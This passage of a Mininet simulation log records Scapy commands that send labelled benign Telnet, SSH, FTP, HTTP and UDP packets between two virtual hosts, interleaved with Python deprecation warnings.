a0c0c0f78a105479194b890a9e5000837cc4b494d0733253a96f0a10b47724d7ffa33e4ae37ee7124ec8298756267d23e18043a0b5da3d7346a37649a1eaf19521d092817f241cf82ddce127e26ea98be640373530b3adaec3fbfa27b73a74bc0ec368ecdda267f926086020d13080f\')); sendp(udp_packet, iface=\'h3-eth0\', verbose=0)"',)
+
+2025-07-13 20:55:56,211 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:55:56,755 - mininet - DEBUG - 
+2025-07-13 20:55:56,755 - BENIGN - DEBUG - Generated UDP traffic from h3:3594 -> h5:12346 [content='0abcb0c60200a8dd6a06b08ecaf8a19e59d2481c...'] [Session 2] [len=1309B]
+2025-07-13 20:55:56,755 - mininet - DEBUG - *** h3 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;syn_packet = Ether()/IP(src=\'10.0.0.3\', dst=\'10.0.0.5\')/TCP(sport=40275, dport=23, flags=\'S\', seq=RandShort()); sendp(syn_packet, iface=\'h3-eth0\', verbose=0)"',)
+
+2025-07-13 20:55:56,816 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:55:57,380 - mininet - DEBUG - 
+2025-07-13 20:55:57,380 - BENIGN - DEBUG - Generated Telnet SYN from h3:40275 -> h5:23 [len=54B]
+2025-07-13 20:55:57,393 - mininet - DEBUG - *** h5 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;synack_packet = Ether()/IP(src=\'10.0.0.5\', dst=\'10.0.0.3\')/TCP(sport=23, dport=40275, flags=\'SA\', seq=RandShort(), ack=RandShort()); sendp(synack_packet, iface=\'h5-eth0\', verbose=0)"',)
+
+2025-07-13 20:55:57,453 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+2025-07-13 20:55:57,454 - mininet - DEBUG - 
+  import cryptography
+
+2025-07-13 20:55:57,998 - mininet - DEBUG - 
+2025-07-13 20:55:57,998 - BENIGN - DEBUG - Generated Telnet SYN-ACK from h5:23 <- h3:40275 [len=54B]
+2025-07-13 20:55:58,010 - mininet - DEBUG - *** h3 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;ack_packet = Ether()/IP(src=\'10.0.0.3\', dst=\'10.0.0.5\')/TCP(sport=40275, dport=23, flags=\'A\', seq=RandShort(), ack=RandShort()); sendp(ack_packet, iface=\'h3-eth0\', verbose=0)"',)
+
+2025-07-13 20:55:58,071 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:55:58,637 - mininet - DEBUG - 
+2025-07-13 20:55:58,638 - BENIGN - DEBUG - Generated Telnet ACK from h3:40275 -> h5:23 [len=54B]
+2025-07-13 20:55:58,649 - mininet - DEBUG - *** h3 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;telnet_packet = Ether()/IP(src=\'10.0.0.3\', dst=\'10.0.0.5\')/TCP(sport=40275, dport=23, flags=\'PA\', seq=RandShort(), ack=RandShort())/Raw(load=bytes.fromhex(\'567fdf2178a4d540afd4f880eb5af81f2b1b5388db1a20dddd17abbf74dbc9df4eb57f42d2f962eb2e878db45d362257a8b229830c7c9510d20dcef93027632e3ea33cc029c488afb10e9d7509b21c3df0854891cfa5266c5aa5f25ebec67499fa811eda33bfa5554214e3fd4faf3f3826c23eae46377aaacabe8ffd0c0f854c01e79ef2099428317a0f01e2bfbe1808dfb927d85f7672bfe1451af30c45252cb437ea1f38dc4bb2f1ef2db464b44a5686324c92e07c5496cefd24b838b6875c64a8c8b9c704359114697d7b448a9d06d036cc199cc9a0ec4bf0dea408ef27e22e14cde72d55830f1b9ed3ad0ad2e069b66d496c7c424fae6ac4a6e12fbd38f2612be89201ab892f1dca41ce99584b7d0b5be37d0d70e584646c0744f7187faa2ea1d67a0a9aa4ef0a79a8529f6caec1c214f3db2ead2ff53a952b2098b496c9561a2f58ae4f83820a8f73064d9a73f5f321441d13f8a2d994518a5a92e116c0a859bcbe33c3bb8126f7b7d2d85ee5fec6e0da9574f62aa049b0d8e596b710bc64aed3a54a70db75cfe471c5755df88151bb9feab35c49eb5835d43423c59eeab7d3ac2e57520c8acd85c01b71128f0464829f756f8dc0500b1fa7867db3968b07c5312d6a6bab5171cfdbf09232807e7daa649c01878d572baf827688a9bc381be107cd17bed30d1944082c5b018ee56f33dac24ff25f0c4a295361b3e4e1dd2900dd106c4cf69c2ac902f78bf0e01aaf051b9534fdb66c72980b94c9e1032d6d5b3c342cc45903aa348aca1c828d9e31fe81801534396ca7f9c953978209c4aa36dd139103b50ed51406e4409daa267cb6de31827354b24e8d16d071935265ec14fb2d27e2841ebd9a5d999805d12d65556e61639dab52f09b04d70f41d3b09a81e374a5f4eb026a8a0e3b1587b63067763f6c6662fa6ae37a7206bf4583b002b0c1be9fffb42773fae69dbd9073f3cb5d61873d8308b1e0698ccbb4a4b9d4bdbd3636a5237973e320f0cd16b16d0454f7df21c1160eef62b9c60159b2530fedf3a97911e0502fd8fbba3b8286f7173a387a8c6f6c67bc9b554dab419a07cdfa1002565b8436e01aea4060e52bcfa3c8f4dcf48ee6da1784f4aee9a1fc913d2b8839ba38ae4dbd3014f670151bfe188aba5a1683c3bb38d2b4c430811b2fe763d9a59fa39ab435eb240c3f88c30b9b2cc7ef7a713356193aed0c9ac5b8c51268abf7201da2848b450b12d9e43108ef255da74bb176632a1d108a0cb02595b999f41fa11b217066c659ee490a992f66e8b024b3d4609ec21b4c9b9e671120047b49c283e98537dd215392ae62a977aa0a13c375e0b9f32cf6e14be259abe63cfb95b5706fc298b70c683762bd53944a5d1c66d0c036559053fa\')); sendp(telnet_packet, iface=\'h3-eth0\', verbose=0)"',)
+
+2025-07-13 20:55:58,710 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+
+2025-07-13 20:55:58,710 - mininet - DEBUG -   import cryptography
+
+2025-07-13 20:55:59,287 - mininet - DEBUG - 
+2025-07-13 20:55:59,287 - BENIGN - DEBUG - Generated Telnet data traffic from h3:40275 -> h5:23 [content='Telnet command'] [Session 3] [len=1040B]
+2025-07-13 20:55:59,287 - mininet - DEBUG - *** h5 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;h5_ack_packet = Ether()/IP(src=\'10.0.0.5\', dst=\'10.0.0.3\')/TCP(sport=23, dport=40275, flags=\'A\', seq=RandShort(), ack=RandShort()); sendp(h5_ack_packet, iface=\'h5-eth0\', verbose=0)"',)
+
+2025-07-13 20:55:59,348 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:55:59,892 - mininet - DEBUG - 
+2025-07-13 20:55:59,892 - BENIGN - DEBUG - Generated Telnet ACK reply from h5:23 <- h3:40275 [len=54B]
+2025-07-13 20:55:59,892 - mininet - DEBUG - *** h3 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;syn_packet = Ether()/IP(src=\'10.0.0.3\', dst=\'10.0.0.5\')/TCP(sport=14462, dport=22, flags=\'S\', seq=RandShort()); sendp(syn_packet, iface=\'h3-eth0\', verbose=0)"',)
+
+2025-07-13 20:55:59,953 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:00,525 - mininet - DEBUG - 
+2025-07-13 20:56:00,525 - BENIGN - DEBUG - Generated SSH SYN from h3:14462 -> h5:22 [len=54B]
+2025-07-13 20:56:00,538 - mininet - DEBUG - *** h5 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;synack_packet = Ether()/IP(src=\'10.0.0.5\', dst=\'10.0.0.3\')/TCP(sport=22, dport=14462, flags=\'SA\', seq=RandShort(), ack=RandShort()); sendp(synack_packet, iface=\'h5-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:00,599 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:01,150 - mininet - DEBUG - 
+2025-07-13 20:56:01,150 - BENIGN - DEBUG - Generated SSH SYN-ACK from h5:22 <- h3:14462 [len=54B]
+2025-07-13 20:56:01,160 - mininet - DEBUG - *** h3 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;ack_packet = Ether()/IP(src=\'10.0.0.3\', dst=\'10.0.0.5\')/TCP(sport=14462, dport=22, flags=\'A\', seq=RandShort(), ack=RandShort()); sendp(ack_packet, iface=\'h3-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:01,221 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:01,787 - mininet - DEBUG - 
+2025-07-13 20:56:01,787 - BENIGN - DEBUG - Generated SSH ACK from h3:14462 -> h5:22 [len=54B]
+2025-07-13 20:56:01,802 - mininet - DEBUG - *** h3 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;ssh_packet = Ether()/IP(src=\'10.0.0.3\', dst=\'10.0.0.5\')/TCP(sport=14462, dport=22, flags=\'PA\', seq=RandShort(), ack=RandShort())/Raw(load=bytes.fromhex(\'09cf7539d2fce7b9164028fbe4062fa1680109514ba2f1d948a70adf26583ce0b478074b47fb3f36aa2c29b800ffc9adc93a547ff363cef79570955c7044acf41465968b376f2b639dae2966c812b7510c6eaf61189c039739992ae00439ba0fcade19f36032dcd46e3e38427c2e06a47fbb29dc812c29026e6c01db05a33ad15ff45e0a240c795aaf215f11bef4f863efb921f9c5b43a9804d967b097e4c0c3e64308cb41761bd63ad48f8e60a4ffaa1e4e1ec524554c5581f66ff43f0ff0247ce961448820e8db9b75d62d8e1a25cdbb676dd9d993bb999f3e323e144bb43857e4942f58ced02b180d946634d5a6cc0cf85ba45745bf6228d48a4d7248bbb15ef5cfe18b59f32a894197a5f5cefc194c2aeecdfab2e85a60a8a90413c6f540e1d44c8307b690d9db47d939276a5bcf2db09121ed659e4861d290a325ba1426ff6b4d48e994863d19014a081cbe1515750ca3ed4b2e44e21a87d1e2c6612d48866c0e9127848bf802eb3bae08c52d111c09ac09498f8899851b9f841bf1fdb57fe7c7d5d75ea2c9fb1746027f730ffa7160e8d4eeef49fab792d9981f4f3b6b905fd6aa796dd0126107869db9b3e7887804128ca7fb21a445d496a08875b494d428b4b161e1e81b30421532bfd83b8c51231304ce19b1a9734084f3186684d7ffea0582c220360f59bfb284e0cca3af87a806522fbc0acbd2373f6e9a0051ab23eb1fde8afe7f185647a5c0facd39152b3d37bdad7e6a26dab7ecd05ba200ad08f490e67834812ff4c114576defb8c0c6eff3915a6b9e329f3c100db55399a367d1dfc6eeb091707c94923b9bdcebb4e73f12af9ef8476f6b44cc3670616dc3de71a9b6db6df843704cc3b4b08a3ca074c95355ff1710e26c484701f57ac9371024501a26d44681252e4c66b98924293b18d52da4424cf3a466ed2457785bb13b819346d92ebdc8913051764a832c97123d78acf82ae5f2ddeb64d09b6dcf86f79dd78af9e8330bf2d5585fd8471684cb3a578d84ae7e5004bf9cfa8b57cf9f07fdfdfd7039f089fe5ef8cd4094f701f0e515df0d220d1d33933840e25b01919d5e16fbf2b82fc5d54a1a298441ccc46613e0fc1138e7445f9d0928af995e2fa2ff9d5fba09ab98ce6d8a6622f894c3018462c32c22623f02ef5063376538519ed12e8923d4aa46a2879864da89c7dbd6014c2f2073e4b15b7887fec024fb1fb4c27498aa3099c79bf85c24a7d8086f8d6fcb29737a49813081b3c8bba681d91fc7ccf2c80431c3de3bd629693befe784c0ec0d40722090bc16748cf89f1789dc52c26847e394db93480ed7270fc37d5b0126ae2f074cb49969dc55119d9e9cfd1d729ecbd36a61177620b1f943624f7484b730d1a726a73a1cbc44df19e01566d188c026796ae78aa0c93fcd3d4a09d2afdb30da1c3e86d4a544c292f3b4ba5ce12eb01895f475bc921160353cda66349fa0f8585cae1a2f7d1e9285836ea33c9388f683d12636f12a304af9ca408b7d75fafa8731eda23a91d4e56a810c5d0eef731ac5cdb34974549ae266a39daab08377fbeebd2289d0b71876af373617067534bd345564e4618e73fcd7cc76b5579285f9057d119ffc9ef90e77064485668064966da80930667c6dadee2e3414fac194010e834cd83ca831e9a30897263b9636974fdd3ba026f0bee2a0f15ba9ab75e8f86ad8b4582c89ce0ef3bc8a9961bab0208ded30da15ed234ba72bfdeb8f6f5e8dc02d5421d097a86525dd6f2661901d5e2fc03bc371afeba5ea1d7c17edd8ce3de763159f91ef8964d3b30c9ce857611c7b6a5d0ffd51942ce09b02db2b27236629c2fe1d733d2e2adb1d9111efdcfa40f50c074fcca26c458a2bff8ceaae0a9af80434aabb3143a63307f299e47f884a01f0f100aeeb080697a7365cc561ff8800737aee0b4e8d3097c34aa2376f1bd82037\')); sendp(ssh_packet, iface=\'h3-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:01,864 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:02,408 - mininet - DEBUG - 
+2025-07-13 20:56:02,408 - BENIGN - DEBUG - Generated SSH data traffic from h3:14462 -> h5:22 [content='SSH encrypted data'] [Session 4] [len=1436B]
+2025-07-13 20:56:02,408 - mininet - DEBUG - *** h5 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;h5_ack_packet = Ether()/IP(src=\'10.0.0.5\', dst=\'10.0.0.3\')/TCP(sport=22, dport=14462, flags=\'A\', seq=RandShort(), ack=RandShort()); sendp(h5_ack_packet, iface=\'h5-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:02,469 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:03,029 - mininet - DEBUG - 
+2025-07-13 20:56:03,030 - BENIGN - DEBUG - Generated SSH ACK reply from h5:22 <- h3:14462 [len=54B]
+2025-07-13 20:56:03,030 - mininet - DEBUG - *** h3 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;syn_packet = Ether()/IP(src=\'10.0.0.3\', dst=\'10.0.0.5\')/TCP(sport=49076, dport=21, flags=\'S\', seq=RandShort()); sendp(syn_packet, iface=\'h3-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:03,091 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:03,663 - mininet - DEBUG - 
+2025-07-13 20:56:03,663 - BENIGN - DEBUG - Generated FTP SYN from h3:49076 -> h5:21 [len=54B]
+2025-07-13 20:56:03,675 - mininet - DEBUG - *** h5 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;synack_packet = Ether()/IP(src=\'10.0.0.5\', dst=\'10.0.0.3\')/TCP(sport=21, dport=49076, flags=\'SA\', seq=RandShort(), ack=RandShort()); sendp(synack_packet, iface=\'h5-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:03,736 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:04,297 - mininet - DEBUG - 
+2025-07-13 20:56:04,298 - BENIGN - DEBUG - Generated FTP SYN-ACK from h5:21 <- h3:49076 [len=54B]
+2025-07-13 20:56:04,311 - mininet - DEBUG - *** h3 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;ack_packet = Ether()/IP(src=\'10.0.0.3\', dst=\'10.0.0.5\')/TCP(sport=49076, dport=21, flags=\'A\', seq=RandShort(), ack=RandShort()); sendp(ack_packet, iface=\'h3-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:04,372 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:04,928 - mininet - DEBUG - 
+2025-07-13 20:56:04,929 - BENIGN - DEBUG - Generated FTP ACK from h3:49076 -> h5:21 [len=54B]
+2025-07-13 20:56:04,944 - mininet - DEBUG - *** h3 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;ftp_packet = Ether()/IP(src=\'10.0.0.3\', dst=\'10.0.0.5\')/TCP(sport=49076, dport=21, flags=\'PA\', seq=RandShort(), ack=RandShort())/Raw(load=bytes.fromhex(\'f98ce8ca3f0ae7a3f05fc8072fb4acc0c0c422a547da0ef1f07bc5d11ce5783ed09534c94f22aae36574f2ebfbb477c04e36d7b4b167e780cd3bcdb0f97410fece56e971afe56af65d72583178113cf2cce2ee9684266f8f38efd497f930c79f39fdf5f3583082f8ebca57830611a41910739fa533e7583495e0aebbff0ecccdc54ef9c34ea211b7279bfbdd61848519686ecc705e7efe3bd1024704dc9e7c96280ef981d4c4839958df513b66f1f587080a2fa11508f0cc4e444d57afa924375c89987b012d9d6e703f8197e415d37260adf91a006813ad59774320a9dd4a0be7ba47be81321c5c6e58b996fdccb03a8535b9d9bc1a3fc95078a4c9bb35ddbce95bc77e0132e9191acdc1a90e40d74ee692aec06ec90d1ed2c6dbb65b3fa66a43d91da1a93bf673a7df43a8d39261178caa76c4654c42a475da1a5dc05d9498ce064b067d339cc66829fd877be89526e0c85a72f22065d230e1bd084f7bce466faa43ab68708b69836bbaff7b2d07fdd041e4c7736b1521066ee4d63d995cc731175164897c66f67ae8612891484afd274e6fb04c4e28999eea8e0185d11f19d53004a12abb5958fc05c78d486556a142db1d910e1d135fa157ba88c2f69287552918d52816089e891d9dfa32bbfd6593c9724a11ef8473d44ff125beefe8c8c6d8b7046d313d802a4fefa4aee78a6694e95be97e85d1159f7051f9e7d9b1fe2d632212451a0b3e5026d1343b5a7680f3ac6180bb7afb2f9685ff6143b32589981d96190144e777176bf9a4483aaeb4a270f306666a05ab77005b74d41f3e1165b4a443a73fbc2299e9dc9e3848434bad6d0946c5e295499aa149d4872f725943fa0a398a9562e55a8334a0baf0405079a33170e6a1f46c0da735b5437f6b1fe58684e3696119794075a8edadd54785a6b77f2c3b32c20f5ef95780e674e6a5fad0d1a6edd302a59acef509542316c3f1a184a821d76f7987560b213f0753a6483dfd90c2706774f83008caf7bba8064017cf063d9816ec6a414333c369959c2cb3d7f9f148749fe9c774279590a87869e1f25e828096c87639b064ad77e6fede49f19e5fd5e3c5bfe93ef1097019d8043452ae5b9b9ae48f71ac74c335d8ee50d67b8296221e775ea47877fd329460d2d8df13560dbc2a619b28c299f4aa96ad77a7b97fac5d932cdb7777f5e878b3e02c456d9ce54c2711b03d8c587e823a1866f8567e03593d06b777fc5abdd945cafa60b03b79edc027f4b6085eb766e4103ca1568099f057ce7b131ad98bca2d4af3cf97a489c681d78d2ad6b6c97d1eabf2c403241329645fc95229b6b288801dbcf544f51edf1812b42d569357b06f1203739b0e76c3e25a1d3e608ecbd159c9d1ed171e37aa042e51a936b7b5758682371b5b039f9b4c868da06b920fa2891949a10224068292dc45aea95ad0c2890cf591768e7ba4d5a664441d73605d628c35326b2d59ca26349157c6c5139e61a530dd3b9558378e06bf6930dc65637f04a1b41040d0acf88e8e12f099f9df6faefd0aca56015fdb52fb21af13103e18864b7fe814f4df504e39fad2de047196f41d1638b479b7e8a3265a7f11ae73a86298d6bea95977c4c4d0e27f950936e3efb411e1ea681ada8fb2864d1bcfd3707a45\')); sendp(ftp_packet, iface=\'h3-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:05,005 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:05,576 - mininet - DEBUG - 
+2025-07-13 20:56:05,576 - BENIGN - DEBUG - Generated FTP data traffic from h3:49076 -> h5:21 [content='FTP file transfer'] [Session 5] [len=1224B]
+2025-07-13 20:56:05,577 - mininet - DEBUG - *** h5 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;h5_ack_packet = Ether()/IP(src=\'10.0.0.5\', dst=\'10.0.0.3\')/TCP(sport=21, dport=49076, flags=\'A\', seq=RandShort(), ack=RandShort()); sendp(h5_ack_packet, iface=\'h5-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:05,638 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:06,227 - mininet - DEBUG - 
+2025-07-13 20:56:06,227 - BENIGN - DEBUG - Generated FTP ACK reply from h5:21 <- h3:49076 [len=54B]
+2025-07-13 20:56:06,227 - mininet - DEBUG - *** h3 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;syn_packet = Ether()/IP(src=\'10.0.0.3\', dst=\'10.0.0.5\')/TCP(sport=61943, dport=80, flags=\'S\', seq=RandShort()); sendp(syn_packet, iface=\'h3-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:06,288 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:06,827 - mininet - DEBUG - 
+2025-07-13 20:56:06,827 - BENIGN - DEBUG - Generated HTTP SYN from h3:61943 -> h5:80 [len=54B]
+2025-07-13 20:56:06,840 - mininet - DEBUG - *** h5 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;synack_packet = Ether()/IP(src=\'10.0.0.5\', dst=\'10.0.0.3\')/TCP(sport=80, dport=61943, flags=\'SA\', seq=RandShort(), ack=RandShort()); sendp(synack_packet, iface=\'h5-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:06,900 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:07,451 - mininet - DEBUG - 
+2025-07-13 20:56:07,451 - BENIGN - DEBUG - Generated HTTP SYN-ACK from h5:80 <- h3:61943 [len=54B]
+2025-07-13 20:56:07,462 - mininet - DEBUG - *** h3 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;ack_packet = Ether()/IP(src=\'10.0.0.3\', dst=\'10.0.0.5\')/TCP(sport=61943, dport=80, flags=\'A\', seq=RandShort(), ack=RandShort()); sendp(ack_packet, iface=\'h3-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:07,524 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:08,069 - mininet - DEBUG - 
+2025-07-13 20:56:08,069 - BENIGN - DEBUG - Generated HTTP ACK from h3:61943 -> h5:80 [len=54B]
+2025-07-13 20:56:08,079 - mininet - DEBUG - *** h3 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;http_packet = Ether()/IP(src=\'10.0.0.3\', dst=\'10.0.0.5\')/TCP(sport=61943, dport=80, flags=\'PA\', seq=RandShort(), ack=RandShort())/Raw(load=bytes.fromhex(\'474554202f696e6465782e68746d6c20485454502f312e310d0a486f73743a2031302e302e302e350d0a557365722d4167656e743a20536361707942656e69676e547261666669630d0a436f6e74656e742d4c656e6774683a203337360d0a0d0afd7de79e0c981a2f0f640b5cbb1a6b1823aee081f78ce3f0ea338fab6067a99d30ebba07a1e43ca6460097db75af8b858f95f268546d64049741d71494695685a3aaba4012f3796c37120a33a299b19952e2b1b0d876d6a068ec4360951e742bdaa5ce90b4bae522c0edd161cc747e12efab23b3a46f99c82d66776583f9ccb985792cf91377b30ffb1958992067cd44fcf4d96e41480ef2b7b72e74aa654a4e5154c885494d525519785ecbbb378a90d0a5a09cda2ecfe287cb69278ca8cf5429a75f3a545d2f1646bd986fa546eb98bc17413e5408a77b290ada4613622fcec8da83d322e47a8e7181c8a66564bccaa4a2dce2cb85b382dddbd6d82908c9a8f0ec1a23141d16783210247436603efdb25d1f56f54627954d19d0514f7fa375e33b3ec1adb7357728b27a1ceb4ea0bb243136fd95071e8a4e10eccddc69816401f5d4791e23275d6312603a4b3b5376cf6d13eb556b096be0da6367acfbbe3b2084ae2f4683336e279a042de880e3977e35ff85174c4bc5\')); sendp(http_packet, iface=\'h3-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:08,140 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:08,688 - mininet - DEBUG - 
+2025-07-13 20:56:08,688 - BENIGN - DEBUG - Generated HTTP data traffic from h3:61943 -> h5:80 [content='GET /index.html HTTP/1.1'] [Session 6] [len=527B]
+2025-07-13 20:56:08,688 - mininet - DEBUG - *** h5 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;h5_ack_packet = Ether()/IP(src=\'10.0.0.5\', dst=\'10.0.0.3\')/TCP(sport=80, dport=80, flags=\'A\', seq=RandShort(), ack=RandShort()); sendp(h5_ack_packet, iface=\'h5-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:08,749 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:09,285 - mininet - DEBUG - 
+2025-07-13 20:56:09,285 - BENIGN - DEBUG - Generated HTTP ACK reply from h5:80 <- h3:61943 [len=54B]
+2025-07-13 20:56:09,285 - mininet - DEBUG - *** h3 : ('python3 -c "from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, RandShort, sendp, sr1;syn_packet = Ether()/IP(src=\'10.0.0.3\', dst=\'10.0.0.5\')/TCP(sport=59087, dport=443, flags=\'S\', seq=RandShort()); sendp(syn_packet, iface=\'h3-eth0\', verbose=0)"',)
+
+2025-07-13 20:56:09,346 - mininet - DEBUG - /home/user/.local/lib/python3.6/site-packages/scapy/config.py:542: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography and will be removed in a future release.
+  import cryptography
+
+2025-07-13 20:56:09,904 - mininet - DEBUG - 
+2025-07-13 20:56:09,904 - BENIGN - DEBUG - Generated HTTPS SYN from h3:59087 -> h5:443 [len=54B]
